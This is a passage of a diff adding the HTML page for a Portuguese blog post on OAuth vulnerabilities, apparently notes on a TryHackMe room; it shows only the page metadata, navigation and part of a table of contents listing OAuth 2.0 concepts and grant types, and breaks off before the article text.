@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="pt" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>OAuth Vulnerabilities – Alex Paulino</title>
+  <meta name="description" content="Objetivos Conceitos essenciais sobre OAuth 2.0. O fluxo do OAuth 2.0. Identificar serviços de OAuth. Explorar técnicas. Evolução do OAuth 2.1. A aula pode ser encontrada aqui room 0Auth Irei documentar a aula e seus exercícios propostos.
+Conceitos chaves Proprietário do recurso O proprietário do recursos pode ser uma pessoa ou sistema, que controla um certo tipo de dado e pode autorizar uma aplicação a acessar este dado em seu nome. O conceito fundamental gira em torno do usuário, seu consentimento e controle, por exemplo, você é o proprietário do recurso como um cliente da cafeteria. Você pode controlar as informações da sua conta e conceder permissão ao aplicativo móvel da cafeteria para acessar seus dados." /><link rel="canonical" href="http://localhost:1313/posts/2025/2025-02-17-oauth/" itemprop="url" />
+
+<meta property="og:title" content="OAuth Vulnerabilities">
+<meta
+  property="og:description"
+  content="
+    
+      Objetivos
+    
+Conceitos essenciais sobre OAuth 2.0.
+O fluxo do OAuth 2.0.
+Identificar serviços de OAuth.
+Explorar técnicas.
+Evolução do OAuth 2.1.
+
+A aula pode ser encontrada aqui room 0Auth
+Irei documentar a aula e seus exercícios propostos.
+Conceitos chaves
+    Proprietário do recurso
+    O proprietário do recursos pode ser uma pessoa ou sistema, que controla um certo tipo de dado e pode autorizar uma aplicação a acessar este dado em seu nome. O conceito fundamental gira em torno do usuário, seu consentimento e controle, por exemplo, você é o proprietário do recurso como um cliente da cafeteria. Você pode controlar as informações da sua conta e conceder permissão ao aplicativo móvel da cafeteria para acessar seus dados.
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/posts/2025/2025-02-17-oauth/"><meta property="article:section" content="posts">
+
+<meta
+  property="article:published_time"
+  content="2025-02-17T11:00:00-03:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2025-02-17T11:00:00-03:00">
+
+
+
+	<meta itemprop="name" content="OAuth Vulnerabilities">
+	<meta itemprop="description" content="Objetivos Conceitos essenciais sobre OAuth 2.0. O fluxo do OAuth 2.0. Identificar serviços de OAuth. Explorar técnicas. Evolução do OAuth 2.1. A aula pode ser encontrada aqui room 0Auth Irei documentar a aula e seus exercícios propostos.
+Conceitos chaves Proprietário do recurso O proprietário do recursos pode ser uma pessoa ou sistema, que controla um certo tipo de dado e pode autorizar uma aplicação a acessar este dado em seu nome. O conceito fundamental gira em torno do usuário, seu consentimento e controle, por exemplo, você é o proprietário do recurso como um cliente da cafeteria. Você pode controlar as informações da sua conta e conceder permissão ao aplicativo móvel da cafeteria para acessar seus dados.">
+	<meta itemprop="datePublished" content="2025-02-17T11:00:00-03:00">
+	<meta itemprop="dateModified" content="2025-02-17T11:00:00-03:00">
+	<meta itemprop="wordCount" content="3359">
+	<meta itemprop="keywords" content="Api,Tryhackme,Web,Application,Auth">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="OAuth Vulnerabilities">
+	<meta name="twitter:description" content="Objetivos Conceitos essenciais sobre OAuth 2.0. O fluxo do OAuth 2.0. Identificar serviços de OAuth. Explorar técnicas. Evolução do OAuth 2.1. A aula pode ser encontrada aqui room 0Auth Irei documentar a aula e seus exercícios propostos.
+Conceitos chaves Proprietário do recurso O proprietário do recursos pode ser uma pessoa ou sistema, que controla um certo tipo de dado e pode autorizar uma aplicação a acessar este dado em seu nome. O conceito fundamental gira em torno do usuário, seu consentimento e controle, por exemplo, você é o proprietário do recurso como um cliente da cafeteria. Você pode controlar as informações da sua conta e conceder permissão ao aplicativo móvel da cafeteria para acessar seus dados.">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+<script src="/js/main-head.js" integrity=""></script>
+
+  
+  
+  </head>
+<body>
+    <a href="#content" class="hx:sr-only hx:focus-visible:not-sr-only hx:focus-visible:fixed hx:focus-visible:z-50 hx:focus-visible:top-2 hx:focus-visible:left-2 hx:focus-visible:bg-primary-500 hx:focus-visible:text-white hx:focus-visible:px-4 hx:focus-visible:py-2 hx:focus-visible:rounded-md hx:focus-visible:text-sm hx:focus-visible:font-medium">Saltar para o conteúdo</a><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-1 hx:md:gap-2 hx:h-[var(--hextra-navbar-height)] hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none">Alex Paulino</span>
+</a>
+<button
+    type="button"
+    class="hextra-search-trigger"
+    data-search-open
+    aria-haspopup="dialog"
+    aria-controls="hextra-search-dialog"
+    aria-label="Procurar..."
+  ><svg class="hextra-search-trigger-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><span class="hextra-search-trigger-label">Procurar...</span>
+    <kbd class="hextra-search-trigger-kbd">CTRL K</kbd>
+  </button><a
+  title=""
+  href="/about/"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Sobre</span>
+</a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/alxpas" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/alexpaulino/" title="LinkedIn"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037c-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85c3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065a2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span class="hx:sr-only">LinkedIn</span>
+          </a><button type="button" aria-label="Menu" aria-expanded="false" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-1 hx:rounded-sm hx:p-1 hx:active:bg-gray-400/20 hx:md:hidden hx:hextra-focus-visible-inset"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-[var(--hextra-navbar-height)] hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--hextra-navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      <li><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/about/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Sobre</span>
+    </a>
+  </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  
+    <div class="hx:md:hidden hx:justify-end hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:justify-items-start hx:grow">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-02-17-oauth/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom-right"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+</div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="Índice">
+    <div class="hextra-scrollbar hx:sticky hx:top-[var(--hextra-navbar-height)] hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--hextra-navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">Nesta página</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#objetivos">Objetivos
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#conceitos-chaves">Conceitos chaves
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#propriet%c3%a1rio-do-recurso">Proprietário do recurso
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#cliente">Cliente
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#servidor-de-autoriza%c3%a7%c3%a3o">Servidor de autorização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#servidor-de-recurso">Servidor de recurso
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#concess%c3%a3o-de-autoriza%c3%a7%c3%a3o">Concessão de Autorização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#token-de-acesso">Token de acesso
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#token-de-atualiza%c3%a7%c3%a3o">Token de atualização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#redirecionar-uri">Redirecionar URI
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#escopo">Escopo
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#par%c3%a2metro-de-estado">Parâmetro de estado
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#token-e-endpoint-de-autoriza%c3%a7%c3%a3o">Token e endpoint de autorização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#tipos-de-concess%c3%a3o-de-oauth">Tipos de concessão de OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#concess%c3%a3o-de-c%c3%b3digo-de-autoriza%c3%a7%c3%a3o">Concessão de código de autorização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#concess%c3%a3o-impl%c3%adcita">Concessão implícita
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
